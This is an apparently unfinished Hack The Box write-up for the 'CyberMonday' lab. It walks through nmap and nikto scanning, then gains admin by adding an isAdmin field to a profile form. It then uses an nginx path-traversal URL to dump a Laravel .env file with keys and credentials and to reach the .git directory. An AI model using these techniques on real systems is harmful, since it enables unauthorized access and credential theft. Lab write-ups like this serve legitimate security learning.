# #1 Introduction
<img width="692" alt="image" src="https://github.com/Mate0r/app.hackthebock.com/assets/94843357/05e5079a-22d0-4d14-bb1f-24a3fd580502">

# #2 nmap

we first add a domain in /etc/hosts so we don't need to remember the IP
```bash
10.10.xx.xx cybermonday.htb
```

we run an nmap scan as sudo so it's doing a SYN scan and not a full TCP connection so it's faster

```bash
sudo nmap -T4 -sV -p- cybermonday.htb
```

we got these open ports
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp open  http    nginx 1.25.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# #3 user.txt

## HTTP (port 80)

we first start by doing a nikto while we'll explore the website \
```bash
┌──(parallels㉿kali)-[~]
└─$ nikto -host cybermonday.htb         
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.10.11.228
+ Target Hostname:    cybermonday.htb
+ Target Port:        80
+ Start Time:         2023-11-29 10:50:08 (GMT1)
---------------------------------------------------------------------------
+ Server: nginx/1.25.1
+ /: Retrieved x-powered-by header: PHP/8.1.20.
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /: Cookie XSRF-TOKEN created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /login/: This might be interesting.
+ /.htaccess: Contains configuration and/or authorization information.
+ /api/soap/?wsdl=1: Retrieved access-control-allow-origin header: *.
+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
+ 7962 requests: 0 error(s) and 8 item(s) reported on remote host
+ End Time:           2023-11-29 11:14:01 (GMT1) (1433 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```
the website use PHP/8.1.20

by seeing the 404 error page, it seems there is a laravel running
<img width="1342" alt="image" src="https://github.com/Mate0r/app.hackthebock.com/assets/94843357/be049187-e056-4f56-8733-91ebb4ddebb2">

there is a .htaccess at the root that confirms this is a laravel




with ffuf, we try to find some url and we find a 500 error http://cybermonday.htb/dashboard \
we are lucky cause the errors are activated : 
<img width="1265" alt="image" src="https://github.com/Mate0r/app.hackthebock.com/assets/94843357/a483757e-69b4-40f7-bf5e-5d18bcc1a904">


so we have a Laravel 9.46.0 running with PHP/8.1.20 on a nginx 1.25.1


we can see that if there is a field isAdmin, maybe we could access to the dashboard when connected \
so we create a basic account \

we found an url http://cybermonday.htb/home/profile where we can update some informations \
if we add a input with name isAdmin and set to 1, then our user will be updated with that field and we can now access to the dashboard page !



by looking in the dashboard, there is 2 interesting page: \
the first is the one where we can add a product with an image (and maybe a webshell ?)\
the second is the changelog page that telling us there is webhook set so we can visit this url : http://webhooks-api-beta.cybermonday.htb/


we can send some request via webhook :
```bash
┌──(parallels㉿kali)-[~]
└─$ curl -X POST -H "Content-Type: application/json" -d '{"username":"your_username"}' http://webhooks-api-beta.cybermonday.htb/auth/login
{"status":"error","message":"\"password\" not defined"}
```

http://webhooks-api-beta.cybermonday.htb/webhooks/fda96d32-e8c8-4301-8fb3-c821a316cf77/0
http://webhooks-api-beta.cybermonday.htb/webhooks/fda96d32-e8c8-4301-8fb3-c821a316cf77/logs

we can get the .env file by calling this url : http://cybermonday.htb/assets../.env
```bash
APP_NAME=CyberMonday
APP_ENV=local
APP_KEY=base64:EX3zUxJkzEAY2xM4pbOfYMJus+bjx6V25Wnas+rFMzA=
APP_DEBUG=true
APP_URL=http://cybermonday.htb

LOG_CHANNEL=stack
LOG_DEPRECATIONS_CHANNEL=null
LOG_LEVEL=debug

DB_CONNECTION=mysql
DB_HOST=db
DB_PORT=3306
DB_DATABASE=cybermonday
DB_USERNAME=root
DB_PASSWORD=root

BROADCAST_DRIVER=log
CACHE_DRIVER=file
FILESYSTEM_DISK=local
QUEUE_CONNECTION=sync
SESSION_DRIVER=redis
SESSION_LIFETIME=120

MEMCACHED_HOST=127.0.0.1

REDIS_HOST=redis
REDIS_PASSWORD=
REDIS_PORT=6379
REDIS_PREFIX=laravel_session:
CACHE_PREFIX=

MAIL_MAILER=smtp
MAIL_HOST=mailhog
MAIL_PORT=1025
MAIL_USERNAME=null
MAIL_PASSWORD=null
MAIL_ENCRYPTION=null
MAIL_FROM_ADDRESS="hello@example.com"
MAIL_FROM_NAME="${APP_NAME}"

AWS_ACCESS_KEY_ID=
AWS_SECRET_ACCESS_KEY=
AWS_DEFAULT_REGION=us-east-1
AWS_BUCKET=
AWS_USE_PATH_STYLE_ENDPOINT=false

PUSHER_APP_ID=
PUSHER_APP_KEY=
PUSHER_APP_SECRET=
PUSHER_APP_CLUSTER=mt1

MIX_PUSHER_APP_KEY="${PUSHER_APP_KEY}"
MIX_PUSHER_APP_CLUSTER="${PUSHER_APP_CLUSTER}"

CHANGELOG_PATH="/mnt/changelog.txt"

REDIS_BLACKLIST=flushall,flushdb
```

we can get the whole code of the app since we can access the url http://cybermonday.htb/assets../.git


http://webhooks-api-beta.cybermonday.htb/jwks.json

https://www.youtube.com/watch?v=ZKrMNwKxitA


